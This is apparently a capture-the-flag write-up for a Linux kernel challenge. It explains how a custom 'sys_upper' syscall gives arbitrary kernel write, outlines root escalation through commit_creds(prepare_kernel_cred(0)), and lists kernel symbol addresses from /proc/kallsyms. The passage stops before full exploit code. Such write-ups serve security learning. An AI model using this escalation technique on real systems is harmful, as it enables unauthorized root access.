# syscall writeup by agam

### In the given syscall.c code, we can see that they add a new syscall named sys_upper to the syscall_table. This syscall essentially converts any string to uppercase.

```c
static int __init initmodule(void ){
	sct = (unsigned int**)SYS_CALL_TABLE;
	sct[NR_SYS_UNUSED] = sys_upper;
	printk("sys_upper(number : 223) is added\n");
	return 0;
}
```
# INDEED? :D


### By inspecting the syscall code further, we can see that essentially, any user has read/write permissions in the kernel, indicated by a 0x20 offset ☠.
```c
asmlinkage long sys_upper(char *in, char* out) {
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i] >= 0x61 && in[i] <= 0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}
```

## On the host, we can see that the kernel module has already been loaded.
```bash
$ lsmod
m 663 0 - Live 0x7f000000 (PO)

$ cat /proc/kallsyms | grep sys_upper
7f000000 t sys_upper    [m]
```

## To gain privileges, we need to change the process privileges and commit them. This can be achieved with this line of code:
```c
commit_creds(prepare_kernel_cred(0))
```

### Where "prepare_kernel_cred" is a func that creates a struct which represents the credentials of a process in the kernel. By passing 0 as an argument, you're essentially asking the kernel to prepare credentials for root. This function allocates and initializes a cred structure with elevated privileges.
```c
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
	const struct cred *old;
	struct cred *new;

    ...

	old = get_task_cred(daemon);

	*new = *old;
	new->non_rcu = 0;
	atomic_long_set(&new->usage, 1);
	get_uid(new->user); 
	get_user_ns(new->user_ns);
	get_group_info(new->group_info);

    ...
}
``` 


### And "commit_creds" is a function that is used to replace the credentials of the current process with the credentials provided as an argument. It effectively changes the process's security context. By passing the result of prepare_kernel_cred(0) as an argument to commit_creds(), you're replacing the current process's credentials with those of the root privileges.

## Let's check the addresses of those functions inside of /proc/kallsyms:
```bash
$ cat /proc/kallsyms | grep sys_call_table
>>> 8000e348 T sys_call_table <<<
```
```bash
    $ cat /proc/kallsyms | grep prepare_kernel_cred
    >>> 8003f924 T prepare_kernel_cred <<<
    80447f34 r __ksymtab_prepare_kernel_cred
    8044ff8c r __kstrtab_prepare_kernel_cred
```
```bash
    $ cat /proc/kallsyms | grep creds
    8003f3d8 T override_creds
    8003f44c T prepare_creds
    8003f51c T revert_creds
    >>> 8003f56c T commit_creds <<<
```
